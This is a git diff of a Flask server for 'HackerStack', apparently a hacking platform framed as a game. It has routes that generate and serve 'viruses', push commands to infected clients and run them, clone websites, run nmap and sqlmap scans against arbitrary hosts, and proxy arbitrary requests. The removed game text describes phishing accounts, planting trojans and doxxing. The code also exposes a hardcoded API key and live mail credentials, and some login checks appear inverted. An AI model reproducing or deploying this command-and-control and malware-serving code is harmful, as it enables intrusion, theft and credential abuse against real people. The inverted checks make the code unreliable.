@@ -3,12 +3,10 @@ import os
 from flask import Flask,request , Response, send_file
 from flask_cors import CORS
 import requests
-import hashlib
 import random
 import string
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import asyncio
 import mimetypes
 import threading
 import time
@@ -16,7 +14,6 @@ from urllib.parse import unquote
 import qrcode
 import json
 import whois
-import markdown
 from zhipuai import ZhipuAI
 import yagmail
 
@@ -28,47 +25,22 @@ import config_loader as config_loader
 import SqlMapScaner as SqlMapScaner
 import dns_searcher as dns_searcher
 import NiktoScaner as NiktoScaner
+import the_matrix as matrix
 
 
 
 app = Flask(__name__)
 CORS(app)
 
-user_server = 'http://user.hackerstack.top'
+user_server = 'https://user.hackerstack.top'
+mail_server = 'https://send.linwinsoft.top'
 url_list = {}
 config: config_loader = None
 visit_request = {}
 ip_proxy = {}
-client = ZhipuAI(api_key="b8487357fcb60284daa628fd8746d8b1.0wahvm5rmBqfFJzq") # 请填写您自己的APIKey
+client = ZhipuAI(api_key="b8487357fcb60284daa628fd8746d8b1.0wahvm5rmBqfFJzq") 
 
 
-game_title = [
-    "社工: 潜伏者",
-    "信息收集: 收集者",
-    "社工: 伪装者",
-    "入侵: 入侵者黑客",
-    "社工: 信息与开户",
-    "信息收集: 全球定位",
-    "法律: 向网络警察报告"
-]
-game_info = [
-    "打入群聊内部获取关键人信息",
-    "收集网站的各个信息安全信息，以辅助之后的黑客攻击",
-    "伪装成QQ安全,发送QQ钓鱼网站，盗取一个运营人员的账户密码",
-    "通过文件上传漏洞，上传木马病毒并入侵黄色网站后台并彻底摧毁",
-    "通过信息收集木马获取系统管理员的信息，并开户管理员，拿到敏感个人信息",
-    "IP定位多个管理员，并记录",
-    "向网警报告非法网站"
-]
-game_stroy = [
-    "本游戏剧情所有内容均由真实事件改编，本游戏大多数工具全部都是真实的黑客工具。常州籍黑客小常在上网的过程中，一个接待员突然加上了他，向他推销黄色网站，于是常州籍黑客小常开始组织团队开始对该网站进行渗透测试: 小常、小王(你)以及小张，你被分配到了信息收集组，用于辅助进攻",
-    "在进行信息收集的时候，发现了这个团伙及其巨大，全国各地用户数量加起来高达 30万以上，这很明显是一个大型的色情犯罪组织，并且各种女大学生在此堕落，你受到了强烈的震撼，更加坚定了你铲除这种不法地带",
-    "为了破解网站的登录系统，你决定进行社会工程学，简单来说就是骗，你试图通过钓鱼网站，使得那个黄色网站的一个管理员中招，并且获取他的QQ密码与账户，登录他的QQ获取到重要犯罪证据",
-    "通过HackerStack游戏模拟漏洞利用工具，上传远程控制木马病毒到目标管理员的管理员页面，控制管理员的计算机,彻底的摧毁黄色网站",
-    "摧毁了黄色网站，那些主要的犯罪分子没有被抓获，他们还会再开新的网站，所以你通过黑客手段，获取他们的信息，通过开户的行为获取到他们的敏感个人信息(现实中违法)",
-    "通过全球定位手段，定位到那个人的所在，这个时候，收集好了最后的犯罪证据，保护好你的证据，你将成为网络守护者",
-    "你们团队将一起收集好的信息汇总起来，并且提交给了网络警察。黄色网站终于被墙了，你也感谢中国长城防火墙，世界上的罪恶又少了。可是，可是，你忘记影藏自己的踪迹了... ..."
-]
 
 class user_sessen():
     username: str = ''
@@ -101,42 +73,30 @@ def game_mail(link):
     except:
         return '输入的链接错误'
 
+@app.route("/get_my_ip")
+def get_my_ip():
+    return request.remote_addr
+
+@app.route("/cors_requests" , methods=['POST','GET'])
+def cors_requests():
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    target = json_obj['target']
+    method = json_obj['method']
+    data = json_obj['data']
+    return requests.request(method, target, data=data).content.decode('utf-8')
+
 @app.route("/send_mail/<user>/<pwd>" , methods=['POST'])
 def send_mail(user , pwd):
-    # 限制每个IP对制定api的访问.
-    client_ip = request.remote_addr
-    if client_ip in visit_request:
-        visit_request[client_ip] = visit_request[client_ip] + 1
-        if visit_request[client_ip] > 5:
-            return 'Too many requests, Max: 5'
-    else:
-        visit_request[client_ip] = 1
 
     r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
-    if r.text != 'Passwd Or UserName Error!':
+    if json.loads(r.text)['message'] == 'login successful.':
         pass
     else:
         return '登录错误'
 
-    data = request.get_data().decode('utf-8')
-    print(data)
-    json_obj = json.loads(data)
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    return requests.post(mail_server+'/send_mail' , data=json.dumps(json_obj))
 
-    # 连接服务器
-    # 用户名、授权码、服务器地址
-    yag_server = yagmail.SMTP(user='linwinsoft@163.com', password='UPBLIZFPDMGGWCRD', host='smtp.163.com')
-
-    # 发送对象列表
-    email_to = [json_obj['send_to']]
-    email_title = json_obj['title']
-    email_content = json_obj['content']
-    # 附件列表
-    email_attachments = []
-    # 发送邮件
-    yag_server.send(email_to, email_title, email_content)
-    # 关闭连接
-    yag_server.close()
-    return "Send Successful!"
 
 @app.route("/bug_search/<check>/<path:website>")
 def bug_search(check , website ):
@@ -202,7 +162,7 @@ def ok_game(user , pwd , level):
 @app.route('/game_level_info/<level>')
 def game_level_info(level):
     try:
-        return '{"title" : "'+game_title[int(level)]+'" , "info" : "'+game_info[int(level)]+'" , "story" : "'+game_stroy[int(level)]+'"}'
+        return '{"title" : "'+matrix.game_title[int(level)]+'" , "info" : "'+matrix.game_info[int(level)]+'" , "story" : "'+matrix.game_stroy[int(level)]+'"}'
     except BaseException as e: 
         print(e)
         return '错误'
@@ -223,25 +183,8 @@ def get_game_level(user , pwd):
             return "1"
     else:
         return '登录错误'
-
-@app.route('/ai_chat/<path:message>')
-def ai_chat(message):
-    # 限制每个IP对制定api的访问.
-    client_ip = request.remote_addr
-    if client_ip in visit_request:
-        visit_request[client_ip] = visit_request[client_ip] + 1
-        if visit_request[client_ip] > 10:
-            return 'Too many requests, Max: 10'
-    else:
-        visit_request[client_ip] = 1
-    response = client.chat.completions.create(
-    model="glm-4",  # 填写需要调用的模型名称
-    messages=[
-        {"role": "user", "content": message},
-    ],)
-    return markdown.markdown(str(response.choices[0].message.content))
-
-@app.route('/subdomain/<path:website>')
+    
+@app.route('/subdomain/<website>/')
 def subdomain_searcher(website):
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
@@ -258,12 +201,12 @@ def get_ip_location(ip):
     r = requests.get('http://ip-api.com/json/'+ip)
     return r.text
 
-@app.route('/dns_search/<path:website>')
+@app.route('/dns_search/<website>/')
 def dns_search(website):
     return dns_searcher.get_dns(website)
 
-@app.route('/sqlmap/<check>/<path:host>')
-def sqlmap_scan(check , host):
+@app.route('/sqlmap/' , methods=['POST'])
+def sqlmap_scan():
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
     if client_ip in visit_request:
@@ -273,14 +216,18 @@ def sqlmap_scan(check , host):
     else:
         visit_request[client_ip] = 1
 
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    host = json_obj['command_values']
+    check = json_obj['check']
+
     r = requests.post(user_server+'/check_ip_check/'+check)
     if json.loads(r.text)['message'] == 'ok':
-        return SqlMapScaner.CommandSqlMap(host=host)
+        return json.dumps({"message" : SqlMapScaner.CommandSqlMap(host)})
     else:
-        return 'check code error.'
+        return json.dumps({"message" : "验证码错误"})
 
-@app.route('/nmap/<check_code>/<path:host>')
-def nmap_scan(check_code , host):
+@app.route('/nmap/' , methods=['POST'])
+def nmap_scan():
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
     if client_ip in visit_request:
@@ -290,41 +237,30 @@ def nmap_scan(check_code , host):
     else:
         visit_request[client_ip] = 1
     
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    host = json_obj['command_values']
+    check_code = json_obj['check']
+
     try:
         if host == '127.0.0.1' or host == '0.0.0.0':
-            return 'NULL'
+            return json.dumps({'message': 'error'})
         r = requests.post(user_server+'/check_ip_check/'+check_code)
         if json.loads(r.text)['message'] == 'ok':
-            return NmapScaner.CommandNmap(host)
+            return json.dumps({"message" : NmapScaner.CommandNmap(host)})
         else:
-            return 'check code error.'
-    except:
-        return 'Nmap Error'
+            return json.dumps({"message" : "验证码错误"})
+    except BaseException as e:
+        print(e)
+        return json.dumps({"message" : "error"})
 
-@app.route('/whois/<path:website>')
-def whois_show(website):
+@app.route('/whois/' , methods=['POST'])
+def whois_show():
+    website = json.loads(request.get_data().decode('utf-8'))['website']
     w = whois.whois(str(website))
     return w
-
-@app.route('/pwd_attack' , methods=['POST'])
-def pwd_attack():
-        data = request.get_data().decode('utf-8').split('\n')
-        url = data[0]
-        check = data[1]
-        body = ''
-
-        for i in range(2, len(data)):
-            body += data[i] +'\n'
-        body = body.strip()
-        r = requests.post(user_server+'/check_ip_check/'+check)
-        if json.loads(r.text)['message'] == 'ok':
-            attack_requests = requests.post(user_server+'/attack_hasjdfjiqu489uodsfhjoasjr9w4ruiosidfjsdlo',data=url+'\n'+body)
-            return attack_requests.text
-        else:
-            return 'check code error.'
         
-@app.route('/create_web_virus/<user>/<pwd>' , methods=['GET'])
-def create_web_virus(user , pwd):
+@app.route('/create_web_virus/' , methods=['GET','POST'])
+def create_web_virus():
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
     if client_ip in visit_request:
@@ -333,6 +269,10 @@ def create_web_virus(user , pwd):
             return 'Too many requests'
     else:
         visit_request[client_ip] = 1
+
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    user = json_obj['user']
+    pwd = json_obj['pwd']
 
     r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
     if r.text != 'Passwd Or UserName Error!':
@@ -350,8 +290,8 @@ def create_web_virus(user , pwd):
     else:
         return 'your message error' 
     
-@app.route('/create_virus/<user>/<pwd>/<type>' , methods=['GET'])
-def create_virus(user , pwd , type):
+@app.route('/create_virus/' , methods=['GET'])
+def create_virus():
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
     if client_ip in visit_request:
@@ -361,8 +301,12 @@ def create_virus(user , pwd , type):
     else:
         visit_request[client_ip] = 1
 
+    json_obj = json.loads(request.get_data().decode('utf-8'))
+    user = json_obj['user']
+    pwd = json_obj['pwd']
+
     r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
-    if r.text != 'Passwd Or UserName Error!':
+    if json.loads(r.text)['message'] == 'login successfull.':
         n = get_random()
         
         u = user_sessen()
@@ -406,9 +350,11 @@ def make_qr_code():
 
 @app.route('/get_virus/<file_name>')
 def get_virus(file_name):
+    if "../" in str(file_name) or str(file_name).startswith('/'):
+        return 'not allow.'
     return send_file("../virus/"+file_name, as_attachment=True)
 
-@app.route('/virus_clear_command/<path:attack_url>' , methods=['GET','POST'])
+@app.route('/virus_clear_command/<attack_url>/' , methods=['GET','POST'])
 def clear_token_command(attack_url):
     if attack_url in url_list.keys():
         if url_list.get(attack_url).attack_type == 'web_virus':
@@ -420,15 +366,14 @@ def clear_token_command(attack_url):
     else:
         return 'your message error'
 
-@app.route('/push/<attack_url>/<path:message>' , methods=['POST' , 'GET'])
-def get_message(attack_url,message):
+@app.route('/push/<attack_url>/' , methods=['POST' , 'GET'])
+def get_message(attack_url):
+    message = json.loads(request.get_data().decode('utf-8'))['content']
 
     if attack_url in url_list.keys():
         if url_list.get(attack_url).attack_type == 'web_virus':
-            print("1190234932-0: "+url_list.get(attack_url).attack_command)
             url_list.get(attack_url).message = unquote(message)
             send_command = url_list.get(attack_url).attack_command
-            # url_list.get(attack_url).attack_command = 'none'
             return send_command
 
         url_list.get(attack_url).message = unquote(message)
@@ -456,13 +401,7 @@ def push_bin(attack_url):
 @app.route('/get_virus_list')
 def get_virus_list():
     list_file = os.listdir('virus/')
-    content = ''
-    for i in list_file:
-        if os.path.isdir('virus/'+i) == True:
-            continue
-        content += i + '\n'
-
-    return content
+    return json.dumps(list_file)
 
 @app.route('/update_virus/<filename>/<check>' , methods=['POST'])
 def update_virus(filename , check):
@@ -470,31 +409,32 @@ def update_virus(filename , check):
     client_ip = request.remote_addr
     if client_ip in visit_request:
         visit_request[client_ip] = visit_request[client_ip] + 1
-        if visit_request[client_ip] >= 6:
-            return 'Too many requests'
+        if visit_request[client_ip] >= 3:
+            return json.dumps({'message': 'Too many requests'})
     else:
         visit_request[client_ip] = 1
     message = str(json.loads(requests.get(user_server+'/check_ip_check/' + check).text.strip())['message'])
     print(message)
     if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
-        return 'FILE NAME IS NULL: index.html or index.htm'
+        return json.dumps({'message': 'not allow.'})
     if message.strip() != 'ok':
-        return 'Check code error.'
+        return json.dumps({'message': 'check code error.'})
 
     current_time = time.time()  # 获取当前时间戳
     local_time = time.localtime(current_time)  # 将时间戳转换为本地时间
-    formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", local_time)  # 格式化时间
+    formatted_time = time.strftime("%Y%m%d%H%M%S", local_time)  # 格式化时间
 
     data = request.get_data()
-    if len(data) > 1024 * 1024 * 10:
-        return 'MAX UPDATE: 10MB.'
+    if len(data) > 1024 * 1024 * 5:
+        return 'MAX UPDATE: 5MB.'
 
     with open('virus/' + formatted_time+"-"+filename , "wb") as f:
         f.write(data)
-    return 'update ok.'
+    return json.dumps({'message': 'ok'})
 
-@app.route('/run/<attack_url>')
-def xhr_run(attack_url):
+@app.route('/run/<token>/')
+def xhr_run(token):
+    attack_url = token
     if attack_url in url_list.keys():
         u: user_sessen = url_list.get(attack_url)
         if u.attack_type == 'VideoVirus':
@@ -509,9 +449,9 @@ def xhr_run(attack_url):
     else:
         return 'none'
     
-@app.route('/virus_run/<attack_url>/<path:command>')
-def virus_run(attack_url , command):
-    print(1)
+@app.route('/virus_run/<attack_url>/' , methods=['POST' , 'GET'])
+def virus_run(attack_url):
+    command = json.loads(request.get_data().decode('utf-8'))['command']
     if attack_url in url_list.keys():
         print("ufdlkaslkfjdlkfjljflkdsjdf")
         u: user_sessen = url_list.get(attack_url)
@@ -574,9 +514,8 @@ def WebClone(attack_url , user , pwd):
         return 'your message error' 
 
 
-@app.route('/api/<attack_type>/<user>/<pwd>/')
+@app.route('/api/<attack_type>/<user>/<pwd>/' , methods=['POST' , 'GET'])
 def attack(attack_type,user,pwd):
-
     # 限制每个IP对制定api的访问.
     client_ip = request.remote_addr
     if client_ip in visit_request:
@@ -587,7 +526,7 @@ def attack(attack_type,user,pwd):
         visit_request[client_ip] = 1
 
     r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
-    if r.text.lower() != 'login failed.':
+    if r.text.lower() != 'login successfull.':
         n = get_random()
         
         u = user_sessen()
